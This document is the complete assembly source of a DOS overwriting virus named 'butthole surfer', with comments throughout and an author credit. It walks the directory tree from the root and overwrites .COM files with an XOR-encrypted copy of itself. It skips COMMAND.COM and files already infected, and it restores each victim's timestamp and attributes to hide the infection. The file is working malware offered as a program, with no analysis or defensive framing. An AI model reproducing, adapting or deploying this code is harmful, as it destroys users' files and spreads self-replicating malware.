; BUTTHOLE.ASM -- butthole surfer virus 
; Written by johnny!

virus_type      equ     1                       ; Overwriting Virus
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org     0100h

start           label   near

main            proc    near
flag:           xchg    di,ax
        xchg    di,ax
        xchg    di,ax
        xchg    di,ax

        call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

        call    search_files            ; Find and infect a file

        mov     ax,04C00h               ; DOS terminate function
        int     021h
main            endp

search_files    proc    near
        push    bp                      ; Save BP
        mov     bp,sp                   ; BP points to local buffer
        sub     sp,64                   ; Allocate 64 bytes on stack

        mov     ah,047h                 ; DOS get current dir function
        xor     dl,dl                   ; DL holds drive # (current)
        lea     si,[bp - 64]            ; SI points to 64-byte buffer
        int     021h

        mov     ah,03Bh                 ; DOS change directory function
        mov     dx,offset root          ; DX points to root directory
        int     021h

        call    traverse                ; Start the traversal

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[bp - 64]            ; DX points to old directory
        int     021h

        mov     sp,bp                   ; Restore old stack pointer
        pop     bp                      ; Restore BP
        ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
        push    bp                      ; Save BP

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; DOS find first function
        mov     cx,00010000b            ; CX holds search attributes
        mov     dx,offset all_files     ; DX points to "*.*"
        int     021h
        jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
        jne     another_dir             ; If not, try again
        cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
        je      another_dir             ;If so, keep going

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[bp - 98]            ; DX points to new directory
        int     021h

        call    traverse                ; Recursively call ourself

        pushf                           ; Save the flags
        mov     ah,03Bh                 ; DOS change directory function
        mov     dx,offset up_dir        ; DX points to parent directory
        int     021h
        popf                            ; Restore the flags

        jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
        int     021h
        jnc     check_dir               ; If found check the file

leave_traverse:
        mov     dx,offset com_mask      ; DX points to "*.COM"
        call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
        mov     ah,01Ah                 ; DOS set DTA function
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      ; Restore BP
        ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
        push    bp                      ; Save BP

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        push    dx                      ; Save file mask
        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; DOS find first file function
        mov     cx,00100111b            ; CX holds all file attributes
        pop     dx                      ; Restore file mask
find_a_file:    int     021h
        jc      done_finding            ; Exit if no files found
        call    infect_file             ; Infect the file!
        jnc     done_finding            ; Exit if no error
        mov     ah,04Fh                 ; DOS find next file function
        jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
        mov     ah,01Ah                 ; DOS set DTA function
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      ; Restore BP
        ret                             ; Return to caller
find_files      endp

infect_file     proc    near
        mov     ah,02Fh                 ; DOS get DTA address function
        int     021h
        mov     si,bx                   ; SI points to the DTA

        mov     byte ptr [set_carry],0  ; Assume we'll fail

        cmp     word ptr [si + 01Ch],0  ; Is the file > 65535 bytes?
        jne     infection_done          ; If it is then exit

        cmp     word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
        je      infection_done          ; If it is then skip it

        cmp     word ptr [si + 01Ah],(finish - start)
        jb      infection_done          ; If it's too small then exit

        mov     ax,03D00h               ; DOS open file function, r/o
        lea     dx,[si + 01Eh]          ; DX points to file name
        int     021h
        xchg    bx,ax                   ; BX holds file handle

        mov     ah,03Fh                 ; DOS read from file function
        mov     cx,4                    ; CX holds bytes to read (4)
        mov     dx,offset buffer        ; DX points to buffer
        int     021h

        mov     ah,03Eh                 ; DOS close file function
        int     021h

        push    si                      ; Save DTA address before compare
        mov     si,offset buffer        ; SI points to comparison buffer
        mov     di,offset flag          ; DI points to virus flag
        mov     cx,4                    ; CX holds number of bytes (4)
    rep     cmpsb                           ; Compare the first four bytes
        pop     si                      ; Restore DTA address
        je      infection_done          ; If equal then exit
        mov     byte ptr [set_carry],1  ; Success -- the file is OK

        mov     ax,04301h               ; DOS set file attrib. function
        xor     cx,cx                   ; Clear all attributes
        lea     dx,[si + 01Eh]          ; DX points to victim's name
        int     021h

        mov     ax,03D02h               ; DOS open file function, r/w
        int     021h
        xchg    bx,ax                   ; BX holds file handle

        push    si                      ; Save SI through call
        call    encrypt_code            ; Write an encrypted copy
        pop     si                      ; Restore SI

        mov     ax,05701h               ; DOS set file time function
        mov     cx,[si + 016h]          ; CX holds old file time
        mov     dx,[si + 018h]          ; DX holds old file date
        int     021h

        mov     ah,03Eh                 ; DOS close file function
        int     021h

        mov     ax,04301h               ; DOS set file attrib. function
        xor     ch,ch                   ; Clear CH for file attribute
        mov     cl,[si + 015h]          ; CX holds file's old attributes
        lea     dx,[si + 01Eh]          ; DX points to victim's name
        int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
        ret                             ; Return to caller

buffer          db      4 dup (?)               ; Buffer to hold test data
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


butt_marker     db      "[BuTT]",0              ; BuTTHoLE creation marker


note            db      "butthole surfer virus; special"
        db      "for our coastal brothers. have"
        db      "phun with this one."

encrypt_code    proc    near
        mov     si,offset encrypt_decrypt; SI points to cipher routine

        xor     ah,ah                   ; BIOS get time function
        int     01Ah
        mov     word ptr [si + 8],dx    ; Low word of timer is new key

        xor     byte ptr [si],1         ;
        xor     byte ptr [si + 7],1     ; Change all SIs to DIs
        xor     word ptr [si + 10],0101h; (and vice-versa)

        mov     di,offset finish        ; Copy routine into heap
        mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
        push    si                      ; Save SI for later
        push    cx                      ; Save CX for later
    rep     movsb                           ; Copy the bytes

        mov     si,offset write_stuff   ; SI points to write stuff
        mov     cx,5                    ; CX holds length of write
    rep     movsb                           ; Copy the bytes

        pop     cx                      ; Restore CX
        pop     si                      ; Restore SI
        inc     cx                      ; Copy the RET also this time
    rep     movsb                           ; Copy the routine again

        mov     ah,040h                 ; DOS write to file function
        mov     dx,offset start         ; DX points to virus

        call    finish                  ; Encrypt/write/decrypt

        ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
        int     021h
encrypt_code    endp

end_of_code     label   near

encrypt_decrypt proc    near
        mov     si,offset start_of_code ; SI points to code to decrypt
        mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
        inc     si                      ; Do the next word
        inc     si                      ;
        loop    xor_loop                ; Loop until we're through
        ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
        end     main

        